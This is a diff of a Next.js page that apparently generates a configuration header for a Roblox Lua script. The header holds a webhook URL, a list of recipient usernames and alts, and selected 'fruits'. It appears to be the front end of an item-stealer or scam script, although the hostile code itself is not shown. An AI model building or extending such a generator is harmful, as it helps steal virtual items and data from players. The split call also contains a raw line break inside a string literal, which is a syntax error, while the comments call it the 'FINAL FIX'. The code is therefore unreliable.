@@ -110,16 +110,16 @@ export default function Home() {
     }
 
     try {
-      // FIX: Specify string type for user parameter and use explicit newline
+      // FINAL FIX: Ensure newline character is correctly inside the split string
       const formattedUsernames = usernames
         .split('
-') // Use explicit newline character
-        .map((user: string) => user.trim()) // Add type for user
-        .filter((user: string) => user.length > 0) // Add type for user
+') // Correctly specify newline character
+        .map((user: string) => user.trim())
+        .filter((user: string) => user.length > 0)
         .map((user: string) => `"${user}"`)
         .join(', ');
 
-      // FIX: Specify string type for fruit parameter
+      // Specify string type for fruit parameter
       const formattedFruits = selectedFruits
         .map((fruit: string) => `"${fruit}"`)
         .join(', ');
@@ -130,7 +130,7 @@ export default function Home() {
       }
 
       // Construct the script (discordUsername is NOT included here)
-      // FIX: Use explicit newlines in script template
+      // Use explicit newlines in script template
       let script = `Webhook = "${webhookUrl}" -- << Protected Webhook Here
 `;
       script += `Usernames = {${formattedUsernames}} -- << Your usernames here, you can add as many alts as you want
